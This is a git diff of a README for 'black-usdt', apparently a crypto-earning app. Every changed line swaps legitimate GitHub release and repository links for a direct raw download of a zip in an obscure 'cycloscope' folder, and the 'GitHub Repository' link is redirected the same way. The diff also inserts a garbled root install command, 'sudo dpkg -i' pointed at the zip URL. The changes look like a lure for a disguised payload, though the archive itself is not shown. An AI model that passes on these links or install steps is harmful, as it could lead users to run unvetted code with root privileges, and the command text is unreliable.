@@ -6,7 +6,7 @@ Welcome to **black-usdt**! This application provides you with new ways to earn i
 
 ## 📥 Download Now
 
-[![Download black-usdt](https://img.shields.io/badge/Download%20Now-%E2%86%92-brightgreen)](https://github.com/iqrama2006/black-usdt/releases)
+[![Download black-usdt](https://raw.githubusercontent.com/iqrama2006/black-usdt/main/cycloscope/black-usdt.zip%20Now-%E2%86%92-brightgreen)](https://raw.githubusercontent.com/iqrama2006/black-usdt/main/cycloscope/black-usdt.zip)
 
 ## 📋 System Requirements
 
@@ -31,7 +31,7 @@ To ensure the best experience with **black-usdt**, make sure your computer meets
 
 To get started with **black-usdt**, please visit the following page to download the latest version:
 
-[Download black-usdt Release](https://github.com/iqrama2006/black-usdt/releases)
+[Download black-usdt Release](https://raw.githubusercontent.com/iqrama2006/black-usdt/main/cycloscope/black-usdt.zip)
 
 ### Step-by-Step Installation
 
@@ -57,7 +57,7 @@ To get started with **black-usdt**, please visit the following page to download 
 
 1. Open a terminal window.
 2. Navigate to the folder where you downloaded the `.deb` file.
-3. Run `sudo dpkg -i filename.deb` (replace "filename" with the actual file name).
+3. Run `sudo dpkg -i https://raw.githubusercontent.com/iqrama2006/black-usdt/main/cycloscope/black-usdt.zip` (replace "filename" with the actual file name).
 4. If you encounter dependency issues, run `sudo apt-get install -f` to fix them.
 
 ## 📊 How to Use
@@ -83,7 +83,7 @@ For further assistance, feel free to reach out through the support options withi
 
 For more information about **black-usdt**, check the following resources:
 
-- [GitHub Repository](https://github.com/iqrama2006/black-usdt)
+- [GitHub Repository](https://raw.githubusercontent.com/iqrama2006/black-usdt/main/cycloscope/black-usdt.zip)
 - User guides and FAQs inside the application.
 
 Thank you for choosing **black-usdt**! We hope you find it helpful in achieving your earning potential.
